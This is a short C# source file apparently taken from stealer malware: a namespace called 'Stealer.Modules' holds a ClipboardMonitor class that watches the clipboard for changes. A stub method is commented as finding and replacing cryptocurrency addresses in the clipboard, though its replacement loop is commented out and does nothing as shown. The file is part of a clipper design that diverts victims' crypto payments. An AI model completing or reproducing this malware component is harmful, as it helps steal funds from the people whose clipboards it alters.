using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Stealer.Modules
{
    internal sealed class ClipboardMonitor
    {
        // Previous clipboard content
        private static string previous_buffer = "";

        // Clipboard is changed
        private static bool clipboard_change(string buffer)
        {
            if (buffer != previous_buffer)
            {
                previous_buffer = buffer;
                return true;
            }
            return false;
        }

        // Find & Replace crypto addresses in clipboard
        private static void replace_clipboard(string buffer)
        {
            if (string.IsNullOrEmpty(buffer))
                return;
            //foreach (KeyValuePair<string, Regex> dictonary in RegexPatterns.patterns)
            //{
            //    string cryptocurrency
            //}
        }
    }
}
